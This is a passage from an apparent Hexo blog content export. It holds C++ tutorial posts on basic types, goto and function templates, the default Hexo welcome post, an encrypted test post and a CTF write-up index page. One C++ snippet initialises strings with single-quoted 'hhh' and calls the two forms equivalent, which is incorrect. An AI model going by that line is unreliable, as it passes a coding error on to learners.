<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> flag=<span class="literal">true</span>; <span class="comment">//flag=1</span></span><br></pre></td></tr></table></figure></div>

<p>C++还有字符串的数据类型<code>string</code>，可能需要用到<code>#include&lt;string&gt;</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">string str = <span class="string">&#x27;hhh&#x27;</span>;</span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&#x27;hhh&#x27;</span>;</span><br><span class="line"><span class="comment">//二者效果一样</span></span><br></pre></td></tr></table></figure></div>

<h2 id="4-跳转语句"><a href="#4-跳转语句" class="headerlink" title="4 跳转语句"></a>4 跳转语句</h2><p>C++多了<code>goto</code>这样的跳转语句，能够使语句直接跳转到对应行继续执行</p>
<p>案例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;1&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">goto</span> FLAG;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;2&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;3&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;4&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	FLAG:</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;5&quot;</span> &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>注意：在程序中不建议使用goto语句，以免造成程序流程混乱</p>
</blockquote>
<h2 id="具体基础部分引入"><a href="#具体基础部分引入" class="headerlink" title="具体基础部分引入"></a>具体基础部分引入</h2><p>这里是<strong>黑马程序员</strong>的免费资料，本人从网盘中下载下来了，要学习完整C++基础资料的可以访问下面链接，链接为我的博客（搬运过来了），里面也有C++基础资料的网盘分享</p>
<a href="/2024/10/21/C++/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" title="C++基础入门">C++基础入门</a>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>data</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/09/09/example/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>example</category>
      </categories>
      <tags>
        <tag>example</tag>
      </tags>
  </entry>
  <entry>
    <title>测试密码访问</title>
    <url>/2024/09/09/example/test-passwd/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9c29d2ae8c9408ebabfe5502d542763af69160ec81974d9abe486a1990c0affe">b7d6aa4f9b0e255d1a59a9e7f2b85d1b1ed944caf21c7e84e4e7408bbf88993cf0d430a5b6e273a1f7a43f8b32eac3de82b6eeb75f7c346696330f8d36f5692a27b30c478d7b56d48dc56572de233ad0130e4a303c4df72a9b15befccec21c02e2aee8df667ff0af8266638f6e91eb6a3bca9f45e4922c6488c20e619887cb0056428b759e3198e95d178adb6800981b0db62870df36f8b0da4a902b04d0e8a6ceee478426bcb36ac1e5b28ae924677481c37900a1de536d7efaa30eb218ef7f223fa63e35f0e1c354d920d7d66d0826589b951e4c6908266586755cf8f9cad0a22961a9c6178b098261f1393913ea36e8dd3cdaf6397b637cdc3d67c1ae5cfd403201d724a44cd364b76a4ef929d18f092b7fef6599a6793491e4d7d652bca7d80798504f5eb9ef3cdaf80f3ebcc23b0cf08d33e0ad7f7409b25bfd41104b9857be0e80a0e2089aea9fc7cd8dcaaeb8d0869460e91bedebc63c8e79916d498bab50676f513b39265bee8b113e4959f44ed3f26f0e91e21e3562751b6e630e5b93e64d69c5d3eaf9c3088c67c59713170f93d18d3d1ca720924fccd220caea295921dbcb25828a70e0948f12124c4995c8c91bbef13371aa993f48558f53d23bfb6859de37901a7215a4219876e9cdf076e340760604fff3a1f813762e132f6ebf866ae10b7d00ab9d795337e5cca897a58550889be251f1cb763a63aead731534794db2feb7da838808a864b7560602b9702ac2cd75230437c7aabf3eaa7178d2f053c482843b3512dbc29c56373ef0f2d94b217ac8b4d3a31f6cb6a104d4483f2da79a75e75d0b66ecc0652c4579d4de9f0c9035d270fccd8552e091cacaf453212de088d7e30e6dee84903441a54774e5f69ad6753498a66b405ed67fa6faff788fe48a27d913199d7f0bb2374c7ebebf999efa28c23e276f42eab52a149b148ae4fbd9a1d1d2ce4f160d26ab160195598371cbac8d56b1ddeafb1089a1a77252986eb69ad798915b056b473116bbf9fcd05009b444ccdeffffbd6b9427b7edc8381965716b9759f5abe789ed3daeca3fa03a06e05494cfd5e75abd767d49b166da24c3e1f1473b9e2038e31d3545745984dd5cca808379572584243128ce2e15ddbc5b85863a6c46c378056b847b577a2616abdccc1a07ee1e52a15dad9e9e747e18efda1be6f421ebbc8a3751d85c6ac4d69b9b18f292314caa2b2a197c75dca9f9e682c0ab35628d707350395c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>example</category>
      </categories>
      <tags>
        <tag>example</tag>
      </tags>
  </entry>
  <entry>
    <title>测试文章时效性</title>
    <url>/2024/09/09/example/%E6%B5%8B%E8%AF%95%E6%97%B6%E6%95%88%E6%80%A7/</url>
    <content><![CDATA[<h1 id="这是测试文字"><a href="#这是测试文字" class="headerlink" title="这是测试文字"></a>这是测试文字</h1><h2 id="这是测试文字-1"><a href="#这是测试文字-1" class="headerlink" title="这是测试文字"></a>这是测试文字</h2><h3 id="这是测试文字-2"><a href="#这是测试文字-2" class="headerlink" title="这是测试文字"></a>这是测试文字</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是测试文字</span><br></pre></td></tr></table></figure></div>

<p>这是测试文字</p>
]]></content>
      <categories>
        <category>example</category>
      </categories>
      <tags>
        <tag>example</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello readers</title>
    <url>/2024/09/12/ctf/writeup/</url>
    <content><![CDATA[<h1 id="HELLO-READERS"><a href="#HELLO-READERS" class="headerlink" title="HELLO READERS"></a>HELLO READERS</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里收录了我在做的CTF题目以及对于学习资料，题目可能来自不同靶场，会有标识的，目前还在持续更新中~</p>
<h2 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h2><h3 id="我的CTF题目WP传送门"><a href="#我的CTF题目WP传送门" class="headerlink" title="我的CTF题目WP传送门"></a>我的CTF题目WP传送门</h3><ol>
<li><a href="/2024/09/12/ctf/writeup/web/%E7%9B%AE%E5%BD%95/catalogue/" title="web安全WP目录">web安全</a></li>
<li><a href="/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/" title="misc安全WP目录">misc安全</a></li>
</ol>
<h3 id="我的CTF题目资料data传送门"><a href="#我的CTF题目资料data传送门" class="headerlink" title="我的CTF题目资料data传送门"></a>我的CTF题目资料data传送门</h3><ol>
<li><a href="/2024/09/12/ctf/data/another/%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/" title="CTF竞赛模式">CTF竞赛模式</a></li>
<li><a href="/2024/09/26/ctf/data/misc/%E7%9B%AE%E5%BD%95/catalogue/" title="misc安全data目录">misc安全</a></li>
</ol>
<h3 id="推荐在线靶场传送门"><a href="#推荐在线靶场传送门" class="headerlink" title="推荐在线靶场传送门"></a>推荐在线靶场传送门</h3><ol>
<li><a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.ctfhub.com/#/index" >CTFHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ol>
<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2><p>本人是个大二学生，平时就是搞搞电脑，只要是和电脑有关的都感兴趣。</p>
<p>（不怎么会自我介绍，就将就看看吧(๑◕ܫ￩๑)b ）</p>
<p> 目前还属于CTF小白，略懂一二内网渗透。有了一点道行后听见学长们推荐写writeup来提升能力，所以就开始了我的wirteup之旅。写writeup文章时不时也会引用一些大佬的资料，希望大家能够一起共同进步，从入门到入土，或者你想从入门到入狱我也不拦你 ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;ε&#x3D;┌(;￣◇￣)┘</p>
<blockquote>
<p>CTF在线靶场都是在线生成的动态flag，若要复现不要直接挪用flag哦，因为你是交不了的 ≖‿≖✧</p>
</blockquote>
<p>话不多说，去看看有没有你心动的WP吧</p>
<p>٩(๑´0&#96;๑)۶ </p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>catalogue</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/10/26/C++/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="C-提高编程"><a href="#C-提高编程" class="headerlink" title="C++提高编程"></a>C++提高编程</h1><ul>
<li>本阶段主要针对C++&#x3D;&#x3D;泛型编程&#x3D;&#x3D;和&#x3D;&#x3D;STL&#x3D;&#x3D;技术做详细讲解，探讨C++更深层的使用</li>
</ul>
<h2 id="1-模板"><a href="#1-模板" class="headerlink" title="1 模板"></a>1 模板</h2><h3 id="1-1-模板的概念"><a href="#1-1-模板的概念" class="headerlink" title="1.1 模板的概念"></a>1.1 模板的概念</h3><p>模板就是建立<strong>通用的模具</strong>，大大<strong>提高复用性</strong></p>
<p>例如生活中的模板</p>
<p>一寸照片模板：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/1547105026929.png"
                      alt="1547105026929"
                ></p>
<p>PPT模板：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/1547103297864.png"
                      alt="1547103297864"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/1547103359158.png"
                      alt="1547103359158"
                ></p>
<p>模板的特点：</p>
<ul>
<li>模板不可以直接使用，它只是一个框架</li>
<li>模板的通用并不是万能的</li>
</ul>
<h3 id="1-2-函数模板"><a href="#1-2-函数模板" class="headerlink" title="1.2 函数模板"></a>1.2 函数模板</h3><ul>
<li><p>C++另一种编程思想称为 &#x3D;&#x3D;泛型编程&#x3D;&#x3D; ，主要利用的技术就是模板</p>
</li>
<li><p>C++提供两种模板机制:<strong>函数模板</strong>和<strong>类模板</strong></p>
</li>
</ul>
<h4 id="1-2-1-函数模板语法"><a href="#1-2-1-函数模板语法" class="headerlink" title="1.2.1 函数模板语法"></a>1.2.1 函数模板语法</h4><p>函数模板作用：</p>
<p>建立一个通用函数，其函数返回值类型和形参类型可以不具体制定，用一个<strong>虚拟的类型</strong>来代表。</p>
<p><strong>语法：</strong> </p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line">函数声明或定义</span><br></pre></td></tr></table></figure></div>

<p><strong>解释：</strong></p>
<p>template  —  声明创建模板</p>
<p>typename  — 表面其后面的符号是一种数据类型，可以用class代替</p>
<p>T    —   通用的数据类型，名称可以替换，通常为大写字母</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//交换整型函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swapInt</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//交换浮点型函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swapDouble</span><span class="params">(<span class="type">double</span>&amp; a, <span class="type">double</span>&amp; b)</span> </span>&#123;</span><br><span class="line">	<span class="type">double</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用模板提供通用的交换函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap</span><span class="params">(T&amp; a, T&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//swapInt(a, b);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用模板实现交换</span></span><br><span class="line">	<span class="comment">//1、自动类型推导</span></span><br><span class="line">	<span class="built_in">mySwap</span>(a, b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、显示指定类型</span></span><br><span class="line">	<span class="built_in">mySwap</span>&lt;<span class="type">int</span>&gt;(a, b);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>函数模板利用关键字 template</li>
<li>使用函数模板有两种方式：自动类型推导、显示指定类型</li>
<li>模板的目的是为了提高复用性，将类型参数化</li>
</ul>
<h4 id="1-2-2-函数模板注意事项"><a href="#1-2-2-函数模板注意事项" class="headerlink" title="1.2.2 函数模板注意事项"></a>1.2.2 函数模板注意事项</h4><p>注意事项：</p>
<ul>
<li><p>自动类型推导，必须推导出一致的数据类型T,才可以使用</p>
</li>
<li><p>模板必须要确定出T的数据类型，才可以使用</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//利用模板提供通用的交换函数</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap</span><span class="params">(T&amp; a, T&amp; b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、自动类型推导，必须推导出一致的数据类型T,才可以使用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="type">char</span> c = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap</span>(a, b); <span class="comment">// 正确，可以推导出一致的T</span></span><br><span class="line">	<span class="comment">//mySwap(a, c); // 错误，推导不出一致的T类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、模板必须要确定出T的数据类型，才可以使用</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//func(); //错误，模板不能独立使用，必须确定出T的类型</span></span><br><span class="line">	<span class="built_in">func</span>&lt;<span class="type">int</span>&gt;(); <span class="comment">//利用显示指定类型的方式，给T一个类型，才可以使用该模板</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>使用模板时必须确定出通用数据类型T，并且能够推导出一致的类型</li>
</ul>
<h4 id="1-2-3-函数模板案例"><a href="#1-2-3-函数模板案例" class="headerlink" title="1.2.3 函数模板案例"></a>1.2.3 函数模板案例</h4><p>案例描述：</p>
<ul>
<li>利用函数模板封装一个排序的函数，可以对<strong>不同数据类型数组</strong>进行排序</li>
<li>排序规则从大到小，排序算法为<strong>选择排序</strong></li>
<li>分别利用<strong>char数组</strong>和<strong>int数组</strong>进行测试</li>
</ul>
<p>示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//交换的函数模板</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap</span><span class="params">(T &amp;a, T&amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	T temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt; <span class="comment">// 也可以替换成typename</span></span><br><span class="line"><span class="comment">//利用选择排序，进行对数组从大到小的排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySort</span><span class="params">(T arr[], <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> max = i; <span class="comment">//最大数的下标</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; len; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[max] &lt; arr[j])</span><br><span class="line">			&#123;</span><br><span class="line">				max = j;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (max != i) <span class="comment">//如果最大数的下标不是i，交换两者</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">mySwap</span>(arr[max], arr[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printArray</span><span class="params">(T arr[], <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//测试char数组</span></span><br><span class="line">	<span class="type">char</span> charArr[] = <span class="string">&quot;bdcfeagh&quot;</span>;</span><br><span class="line">	<span class="type">int</span> num = <span class="built_in">sizeof</span>(charArr) / <span class="built_in">sizeof</span>(<span class="type">char</span>);</span><br><span class="line">	<span class="built_in">mySort</span>(charArr, num);</span><br><span class="line">	<span class="built_in">printArray</span>(charArr, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//测试int数组</span></span><br><span class="line">	<span class="type">int</span> intArr[] = &#123; <span class="number">7</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span> &#125;;</span><br><span class="line">	<span class="type">int</span> num = <span class="built_in">sizeof</span>(intArr) / <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">	<span class="built_in">mySort</span>(intArr, num);</span><br><span class="line">	<span class="built_in">printArray</span>(intArr, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：模板可以提高代码复用，需要熟练掌握</p>
<h4 id="1-2-4-普通函数与函数模板的区别"><a href="#1-2-4-普通函数与函数模板的区别" class="headerlink" title="1.2.4 普通函数与函数模板的区别"></a>1.2.4 普通函数与函数模板的区别</h4><p><strong>普通函数与函数模板区别：</strong></p>
<ul>
<li>普通函数调用时可以发生自动类型转换（隐式类型转换）</li>
<li>函数模板调用时，如果利用自动类型推导，不会发生隐式类型转换</li>
<li>如果利用显示指定类型的方式，可以发生隐式类型转换</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">myAdd01</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数模板</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">myAdd02</span><span class="params">(T a, T b)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用函数模板时，如果用自动类型推导，不会发生自动类型转换,即隐式类型转换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="type">char</span> c = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="built_in">myAdd01</span>(a, c) &lt;&lt; endl; <span class="comment">//正确，将char类型的&#x27;c&#x27;隐式转换为int类型  &#x27;c&#x27; 对应 ASCII码 99</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//myAdd02(a, c); // 报错，使用自动类型推导时，不会发生隐式类型转换</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">myAdd02</span>&lt;<span class="type">int</span>&gt;(a, c); <span class="comment">//正确，如果用显示指定类型，可以发生隐式类型转换</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：建议使用显示指定类型的方式，调用函数模板，因为可以自己确定通用类型T</p>
<h4 id="1-2-5-普通函数与函数模板的调用规则"><a href="#1-2-5-普通函数与函数模板的调用规则" class="headerlink" title="1.2.5 普通函数与函数模板的调用规则"></a>1.2.5 普通函数与函数模板的调用规则</h4><p>调用规则如下：</p>
<ol>
<li>如果函数模板和普通函数都可以实现，优先调用普通函数</li>
<li>可以通过空模板参数列表来强制调用函数模板</li>
<li>函数模板也可以发生重载</li>
<li>如果函数模板可以产生更好的匹配,优先调用函数模板</li>
</ol>
<p><strong>示例：</strong></p>
